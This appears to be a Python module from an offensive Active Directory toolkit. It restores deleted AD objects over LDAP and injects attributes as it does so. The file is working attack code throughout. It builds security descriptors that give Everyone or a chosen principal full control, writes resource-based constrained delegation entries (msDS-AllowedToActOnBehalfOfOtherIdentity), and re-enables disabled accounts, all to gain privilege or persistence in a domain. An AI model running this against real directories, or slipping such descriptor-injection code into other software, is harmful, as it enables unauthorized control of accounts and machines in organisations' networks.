import logging
import re
from uuid import UUID

from ldap3 import MODIFY_DELETE, MODIFY_REPLACE, MODIFY_ADD
from ldap3.utils.conv import escape_filter_chars, escape_bytes
from ldap3.utils.dn import escape_rdn

from necronomicon.connection import LDAPSession, LDAP_SERVER_SHOW_DELETED_OID
from necronomicon.utils import format_sid, sid_to_bytes, parse_guid

ACCOUNTDISABLE = 0x0002

SHOW_DELETED = (LDAP_SERVER_SHOW_DELETED_OID, True, None)

LOCAL_SYSTEM_SID = sid_to_bytes('S-1-5-18')
EVERYONE_SID = sid_to_bytes('S-1-1-0')


# ── SD construction helpers ──────────────────────────────────────────

def _build_ace(trustee_sid_bytes, mask=0x000F01FF):
    ace_size = 4 + 4 + len(trustee_sid_bytes)
    return (
        b'\x00\x00'
        + ace_size.to_bytes(2, 'little')
        + mask.to_bytes(4, 'little')
        + trustee_sid_bytes
    )


def _build_dacl(aces_bytes_list):
    body = b''.join(aces_bytes_list)
    dacl_size = 8 + len(body)
    return (
        b'\x02\x00'
        + dacl_size.to_bytes(2, 'little')
        + len(aces_bytes_list).to_bytes(2, 'little')
        + b'\x00\x00'
        + body
    )


def _build_sd(dacl, owner_sid=None, group_sid=None):
    header_size = 20
    owner_offset = 0
    group_offset = 0
    parts = b''
    offset = header_size

    if owner_sid:
        owner_offset = offset
        parts += owner_sid
        offset += len(owner_sid)
    if group_sid:
        group_offset = offset
        parts += group_sid
        offset += len(group_sid)

    dacl_offset = offset

    control = 0x8004  # SE_SELF_RELATIVE | SE_DACL_PRESENT
    return (
        b'\x01\x00'
        + control.to_bytes(2, 'little')
        + owner_offset.to_bytes(4, 'little')
        + group_offset.to_bytes(4, 'little')
        + b'\x00\x00\x00\x00'
        + dacl_offset.to_bytes(4, 'little')
        + parts
        + dacl
    )


def build_everyone_full_sd():
    ace = _build_ace(EVERYONE_SID, 0x000F01FF)
    dacl = _build_dacl([ace])
    return _build_sd(dacl)


def build_rbcd_sd(trustee_sid_bytes):
    ace = _build_ace(trustee_sid_bytes, 0x000F01FF)
    dacl = _build_dacl([ace])
    return _build_sd(dacl, owner_sid=LOCAL_SYSTEM_SID,
                     group_sid=LOCAL_SYSTEM_SID)


def build_principal_full_sd(principal_sid_bytes):
    ace = _build_ace(principal_sid_bytes, 0x000F01FF)
    dacl = _build_dacl([ace])
    return _build_sd(dacl, owner_sid=principal_sid_bytes)


# ── Target discovery ─────────────────────────────────────────────────

DEL_MARKER = '\\0ADEL:'

FIND_ATTRIBUTES = [
    'name', 'sAMAccountName', 'objectSid', 'objectGUID', 'objectClass',
    'lastKnownParent', 'msDS-LastKnownRDN', 'isDeleted', 'isRecycled',
    'whenCreated', 'whenChanged', 'userAccountControl',
]

GUID_RE = re.compile(
    r'^\{?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\}?$',
    re.IGNORECASE)
SID_RE = re.compile(r'^S-1-[0-59]-\d+(-\d+)*$', re.IGNORECASE)


def _build_search_filter(identifier):
    if SID_RE.match(identifier):
        return '(&(isDeleted=TRUE)(objectSid=%s))' % identifier
    if GUID_RE.match(identifier):
        guid_bytes = UUID(identifier.strip('{}')).bytes_le
        return '(&(isDeleted=TRUE)(objectGUID=%s))' % escape_bytes(guid_bytes)
    value = escape_filter_chars(identifier)
    return ('(&(isDeleted=TRUE)(|(sAMAccountName=%s)(msDS-LastKnownRDN=%s)(name=%s)))'
            % (value, value, value))


def find_target(session, identifier):
    controls = session.get_deleted_object_controls()
    search_filter = _build_search_filter(identifier)
    matches = []
    for entry in session.search(search_filter, FIND_ATTRIBUTES, controls=controls):
        if entry['dn'].lower().startswith('cn=deleted objects'):
            continue
        matches.append(entry)
    return matches


def _first(value):
    if isinstance(value, list):
        return value[0] if value else None
    return value


def _last_known_rdn(entry):
    rdn = _first(entry['attributes'].get('msDS-LastKnownRDN'))
    if rdn:
        return rdn
    first_component = entry['dn'].split(',', 1)[0].split('=', 1)[1]
    return first_component.split(DEL_MARKER, 1)[0]


def _validate_target(entry):
    if _first(entry['attributes'].get('isRecycled')):
        return 'Object is recycled and cannot be restored'
    return None


# ── Change builder ───────────────────────────────────────────────────

def build_changes(set_attrs=None, add_attrs=None, del_attrs=None,
                  sd_everyone=False, sd_principal=None, sd_rbcd=None):
    changes = {}

    if sd_everyone:
        changes['nTSecurityDescriptor'] = [(MODIFY_REPLACE, [build_everyone_full_sd()])]
    elif sd_principal:
        sd = build_principal_full_sd(sid_to_bytes(sd_principal))
        changes['nTSecurityDescriptor'] = [(MODIFY_REPLACE, [sd])]

    if sd_rbcd:
        sd = build_rbcd_sd(sid_to_bytes(sd_rbcd))
        changes['msDS-AllowedToActOnBehalfOfOtherIdentity'] = [(MODIFY_REPLACE, [sd])]

    for pair in (set_attrs or []):
        attr, val = _split_attr_value(pair)
        changes[attr] = [(MODIFY_REPLACE, [val])]

    for pair in (add_attrs or []):
        attr, val = _split_attr_value(pair)
        if attr in changes and changes[attr][0][0] == MODIFY_ADD:
            changes[attr][0][1].append(val)
        else:
            changes[attr] = [(MODIFY_ADD, [val])]

    for attr in (del_attrs or []):
        changes[attr] = [(MODIFY_DELETE, [])]

    return changes


def _split_attr_value(pair):
    if '=' not in pair:
        raise ValueError('Invalid attribute format: %r (expected attr=value)' % pair)
    attr, val = pair.split('=', 1)
    return attr.strip(), val


# ── Restore executor ─────────────────────────────────────────────────

def execute_restore(session, entry, changes, target_ou=None, new_name=None):
    attrs = entry['attributes']
    parent = target_ou or _first(attrs.get('lastKnownParent'))
    if not parent:
        return False, 'No lastKnownParent and no --target-ou specified'

    rdn_type = entry['dn'].split('=', 1)[0]
    rdn_value = new_name or _last_known_rdn(entry)
    new_dn = '%s=%s,%s' % (rdn_type, escape_rdn(rdn_value), parent)
    guid = parse_guid(_first(attrs.get('objectGUID')))

    restore_changes = {
        'isDeleted': [(MODIFY_DELETE, [])],
        'distinguishedName': [(MODIFY_REPLACE, [new_dn])],
    }
    restore_changes.update(changes)

    injected = [k for k in changes if k not in ('isDeleted', 'distinguishedName')]
    target = '<GUID=%s>' % guid
    if injected:
        logging.info('Restoring %s to %s with injected attributes: %s',
                     target, new_dn, injected)
    else:
        logging.info('Restoring %s to %s (no attribute injection)', target, new_dn)

    ok = session.ldap.modify(target, restore_changes,
                             controls=[SHOW_DELETED])
    result = session.ldap.result or {}
    if ok and result.get('result') == 0:
        return True, new_dn
    msg = '%s: %s' % (result.get('description', 'unknown'),
                      result.get('message', '').strip('\x00').strip())
    return False, msg


# ── Main orchestration ───────────────────────────────────────────────

def run_restore(session, target_id, changes, target_ou=None, new_name=None,
                enable=False):
    matches = find_target(session, target_id)
    if not matches:
        logging.error('No deleted object found matching: %s', target_id)
        return False

    if len(matches) > 1:
        logging.error('%d objects match "%s". Specify the objectGUID:', len(matches), target_id)
        for m in matches:
            guid = parse_guid(_first(m['attributes'].get('objectGUID')))
            name = _last_known_rdn(m)
            sam = _first(m['attributes'].get('sAMAccountName')) or ''
            logging.error('  %s  %-30s  %s', guid, name, sam)
        return False

    entry = matches[0]
    err = _validate_target(entry)
    if err:
        logging.error('%s', err)
        return False

    if enable and 'userAccountControl' not in changes:
        uac = _first(entry['attributes'].get('userAccountControl'))
        if uac is not None:
            uac = int(uac) & ~ACCOUNTDISABLE
            changes['userAccountControl'] = [(MODIFY_REPLACE, [str(uac)])]
            logging.info('Enabling account: UAC 0x%x', uac)

    obj_classes = entry['attributes'].get('objectClass', [])
    obj_type = obj_classes[-1].lower() if obj_classes else 'unknown'
    name = _last_known_rdn(entry)
    guid = parse_guid(_first(entry['attributes'].get('objectGUID')))
    logging.info('Target: %s (GUID: %s, class: %s)', name, guid, obj_type)

    ok, detail = execute_restore(session, entry, changes,
                                 target_ou=target_ou, new_name=new_name)
    if ok:
        logging.info('SUCCESS: %s restored to %s', name, detail)
        return True
    else:
        logging.error('FAILED: %s', detail)
        return False
